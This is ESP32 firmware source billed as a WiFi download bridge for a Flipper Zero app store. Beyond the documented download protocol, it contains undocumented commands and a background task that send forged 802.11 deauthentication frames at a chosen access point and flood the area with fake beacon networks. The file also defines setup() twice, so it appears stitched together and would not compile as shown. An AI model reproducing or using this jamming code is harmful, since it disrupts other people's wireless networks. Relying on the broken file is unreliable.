/*
 * Flipped App Store - ESP32 WiFi Bridge Firmware
 *
 * Flash this to an ESP32/ESP32-S2 WiFi dev board connected to the
 * Flipper Zero via UART (GPIO pins).
 *
 * Wiring:
 *   ESP32 TX -> Flipper RX (pin 14 / PA7)
 *   ESP32 RX -> Flipper TX (pin 13 / PA6)
 *   ESP32 GND -> Flipper GND
 *   ESP32 3V3 -> Flipper 3V3 (or power via USB)
 *
 * UART Protocol:
 *   AT\r\n                -> OK\r\n
 *   WIFI_STATUS\r\n       -> CONNECTED\r\n | DISCONNECTED\r\n
 *   WIFI_SSID <ssid>\r\n  -> OK\r\n | ERROR:<msg>\r\n
 *   WIFI_PASS <pass>\r\n  -> OK\r\n
 *   WIFI_CONNECT\r\n      -> CONNECTED\r\n | ERROR:<msg>\r\n
 *   DOWNLOAD <url>\r\n    -> SIZE:<bytes>\r\n<raw data>\r\nDONE\r\n
 *                         -> ERROR:<msg>\r\n
 */

#include <WiFi.h>
#include <HTTPClient.h>
#include <esp_wifi.h>

// UART to Flipper Zero
#define FLIPPER_SERIAL Serial1
#define FLIPPER_BAUD 115200
#define FLIPPER_RX_PIN 16  // Adjust for your board
#define FLIPPER_TX_PIN 17  // Adjust for your board

// WiFi credentials (can be set via UART commands or hardcoded)
static String wifi_ssid = "";
static String wifi_pass = "";

// Max download size (1MB)
#define MAX_DOWNLOAD_SIZE (1024 * 1024)

void setup() {
    Serial.begin(115200);
    Serial.println("Flipped WiFi Bridge starting...");

    FLIPPER_SERIAL.begin(FLIPPER_BAUD, SERIAL_8N1, FLIPPER_RX_PIN, FLIPPER_TX_PIN);

    // Try to load saved WiFi credentials from preferences
    // or connect to previously saved network
    WiFi.mode(WIFI_STA);
    WiFi.setAutoReconnect(true);

    // If credentials were saved previously, WiFi.begin() will use them
    if (wifi_ssid.length() > 0) {
        WiFi.begin(wifi_ssid.c_str(), wifi_pass.c_str());
        Serial.printf("Connecting to %s...\n", wifi_ssid.c_str());

        unsigned long start = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
            delay(250);
        }

        if (WiFi.status() == WL_CONNECTED) {
            Serial.printf("Connected! IP: %s\n", WiFi.localIP().toString().c_str());
        } else {
            Serial.println("WiFi connection failed");
        }
    }

    Serial.println("Ready for commands");
}

void send_response(const char* response) {
    FLIPPER_SERIAL.print(response);
    FLIPPER_SERIAL.print("\r\n");
    FLIPPER_SERIAL.flush();
}

void handle_download(const char* url) {
    if (WiFi.status() != WL_CONNECTED) {
        send_response("ERROR:Not connected to WiFi");
        return;
    }

    Serial.printf("Downloading: %s\n", url);

    HTTPClient http;
    http.begin(url);
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setTimeout(15000);

    int httpCode = http.GET();

    if (httpCode != HTTP_CODE_OK) {
        char err[64];
        snprintf(err, sizeof(err), "ERROR:HTTP %d", httpCode);
        send_response(err);
        http.end();
        return;
    }

    int contentLength = http.getSize();
    if (contentLength <= 0) {
        send_response("ERROR:Unknown content length");
        http.end();
        return;
    }

    if (contentLength > MAX_DOWNLOAD_SIZE) {
        send_response("ERROR:File too large");
        http.end();
        return;
    }

    // Send size header
    char header[32];
    snprintf(header, sizeof(header), "SIZE:%d", contentLength);
    send_response(header);

    // Small delay to let Flipper process the header
    delay(50);

    // Stream file data to Flipper
    WiFiClient* stream = http.getStreamPtr();
    uint8_t buf[512];
    int remaining = contentLength;

    while (remaining > 0 && stream->connected()) {
        int toRead = remaining > (int)sizeof(buf) ? (int)sizeof(buf) : remaining;
        int bytesRead = stream->readBytes(buf, toRead);

        if (bytesRead <= 0) {
            break;
        }

        FLIPPER_SERIAL.write(buf, bytesRead);
        FLIPPER_SERIAL.flush();
        remaining -= bytesRead;

        // Small yield to prevent watchdog
        yield();
    }

    http.end();

    // Send completion marker
    delay(10);
    send_response("\r\nDONE");

    Serial.printf("Download complete, sent %d bytes\n", contentLength - remaining);
}

enum JammingMode {
    JAM_NONE,
    JAM_DEAUTH,
    JAM_BEACON
};

static JammingMode current_jam_mode = JAM_NONE;
static uint8_t target_bssid[6];
static String beacon_prefix = "FLIP_";
static int beacon_count = 15;
static TaskHandle_t jammingTaskHandle = NULL;

void jamming_task(void* pvParameters) {
    while (true) {
        if (current_jam_mode == JAM_DEAUTH) {
            uint8_t deauth_frame[26] = {
                0xC0, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x07, 0x00
            };
            memcpy(deauth_frame + 10, target_bssid, 6);
            memcpy(deauth_frame + 16, target_bssid, 6);
            
            for(int i=0; i<5; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
                delay(5);
            }
        } else if (current_jam_mode == JAM_BEACON) {
            for (int i = 0; i < beacon_count; i++) {
                uint8_t mac[6];
                for(int j=0; j<6; j++) mac[j] = random(256);
                mac[0] = 0x02; // Local admin MAC

                String ssid = beacon_prefix + String(random(1000, 9999));
                uint8_t ssid_len = ssid.length();

                uint8_t beacon_frame[128] = {
                    0x80, 0x00, 0x00, 0x00,
                    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest: Broadcast
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src: Random
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Random
                    0x00, 0x00, // Seq
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
                    0x64, 0x00, // Beacon interval
                    0x11, 0x04, // Capability info
                    0x00, ssid_len // SSID tag
                };
                memcpy(beacon_frame + 10, mac, 6);
                memcpy(beacon_frame + 16, mac, 6);
                memcpy(beacon_frame + 38, ssid.c_str(), ssid_len);
                
                size_t frame_len = 38 + ssid_len;
                // Supported rates tag
                beacon_frame[frame_len++] = 0x01;
                beacon_frame[frame_len++] = 0x08;
                memcpy(beacon_frame + frame_len, "\x82\x84\x8b\x96\x24\x30\x48\x6c", 8);
                frame_len += 8;
                // DS Parameter Set (Channel)
                beacon_frame[frame_len++] = 0x03;
                beacon_frame[frame_len++] = 0x01;
                beacon_frame[frame_len++] = (uint8_t)random(1, 12);

                esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
                delay(2);
            }
        }
        delay(10);
        yield();
    }
}

void handle_command(String& cmd) {
    cmd.trim();
    if (cmd.length() == 0) return;

    Serial.printf("CMD: %s\n", cmd.c_str());

    if (cmd == "AT") {
        send_response("OK");
    } else if (cmd == "WIFI_STATUS") {
        if (WiFi.status() == WL_CONNECTED) {
            send_response("CONNECTED");
        } else {
            send_response("DISCONNECTED");
        }
    } else if (cmd.startsWith("WIFI_SSID ")) {
        wifi_ssid = cmd.substring(10);
        send_response("OK");
    } else if (cmd.startsWith("WIFI_PASS ")) {
        wifi_pass = cmd.substring(10);
        send_response("OK");
    } else if (cmd == "WIFI_CONNECT") {
        if (wifi_ssid.length() == 0) {
            send_response("ERROR:No SSID set");
            return;
        }

        WiFi.disconnect();
        delay(100);
        WiFi.begin(wifi_ssid.c_str(), wifi_pass.c_str());

        unsigned long start = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start < 15000) {
            delay(250);
        }

        if (WiFi.status() == WL_CONNECTED) {
            Serial.printf("Connected! IP: %s\n", WiFi.localIP().toString().c_str());
            send_response("CONNECTED");
        } else {
            send_response("ERROR:Connection failed");
        }
    } else if (cmd == "WIFI_DISCONNECT") {
        WiFi.disconnect();
        delay(100);
        send_response("OK");
    } else if (cmd == "WIFI_SCAN") {
        Serial.println("Scanning WiFi networks...");
        current_jam_mode = JAM_NONE;
        int n = WiFi.scanNetworks();
        if (n < 0) {
            send_response("ERROR:Scan failed");
            return;
        }

        for (int i = 0; i < n; i++) {
            char line[128];
            snprintf(line, sizeof(line), "%ddBm|CH%d|%s|%s|%s",
                WiFi.RSSI(i),
                WiFi.channel(i),
                (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "LOCKED",
                WiFi.BSSIDstr(i).c_str(),
                WiFi.SSID(i).c_str());
            send_response(line);
        }

        WiFi.scanDelete();
        send_response("DONE");
    } else if (cmd.startsWith("WIFI_DEAUTH_START ")) {
        String bssidStr = cmd.substring(18);
        bssidStr.trim();
        int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &target_bssid[0], &target_bssid[1], &target_bssid[2], &target_bssid[3], &target_bssid[4], &target_bssid[5]);

        if (parsed != 6) {
            send_response("ERROR:Invalid BSSID");
            return;
        }

        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        current_jam_mode = JAM_DEAUTH;
        send_response("JAMMING_STARTED");
    } else if (cmd == "WIFI_JAM_STOP") {
        current_jam_mode = JAM_NONE;
        esp_wifi_set_promiscuous(false);
        send_response("STOPPED");
    } else if (cmd.startsWith("WIFI_BEACON_START ")) {
        // WIFI_BEACON_START <prefix> <count>
        String args = cmd.substring(18);
        int spaceIdx = args.indexOf(' ');
        if (spaceIdx > 0) {
            beacon_prefix = args.substring(0, spaceIdx);
            beacon_count = args.substring(spaceIdx + 1).toInt();
        } else {
            beacon_prefix = args;
            beacon_count = 15;
        }
        
        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        current_jam_mode = JAM_BEACON;
        send_response("FLOOD_STARTED");
    } else if (cmd.startsWith("WIFI_DEAUTH ")) {
        // Legacy deauth support
        String bssidStr = cmd.substring(12);
        bssidStr.trim();
        int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &target_bssid[0], &target_bssid[1], &target_bssid[2], &target_bssid[3], &target_bssid[4], &target_bssid[5]);
        
        if (parsed == 6) {
            esp_wifi_set_mode(WIFI_MODE_STA);
            esp_wifi_start();
            esp_wifi_set_promiscuous(true);
            uint8_t deauth_frame[26] = {
                0xC0, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x07, 0x00
            };
            memcpy(deauth_frame + 10, target_bssid, 6);
            memcpy(deauth_frame + 16, target_bssid, 6);
            for(int i=0; i<50; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
                delay(5);
            }
            esp_wifi_set_promiscuous(false);
            send_response("Sent 50 deauth frames");
        } else {
            send_response("ERROR:Invalid BSSID");
        }
    } else if (cmd.startsWith("DOWNLOAD ")) {
        String url = cmd.substring(9);
        url.trim();
        handle_download(url.c_str());
    } else {
        send_response("ERROR:Unknown command");
    }
}

void setup() {
    Serial.begin(115200);
    FLIPPER_SERIAL.begin(FLIPPER_BAUD, SERIAL_8N1, FLIPPER_RX_PIN, FLIPPER_TX_PIN);
    WiFi.mode(WIFI_STA);
    
    xTaskCreate(jamming_task, "jamming_task", 4096, NULL, 1, &jammingTaskHandle);
    
    Serial.println("Flipped WiFi Bridge starting...");
    Serial.println("Ready for commands");
}

void loop() {
    static String inputBuffer = "";
    while (FLIPPER_SERIAL.available()) {
        char c = FLIPPER_SERIAL.read();
        if (c == '\n') {
            handle_command(inputBuffer);
            inputBuffer = "";
        } else if (c != '\r') {
            if (inputBuffer.length() < 1024) inputBuffer += c;
        }
    }
    delay(1);
}
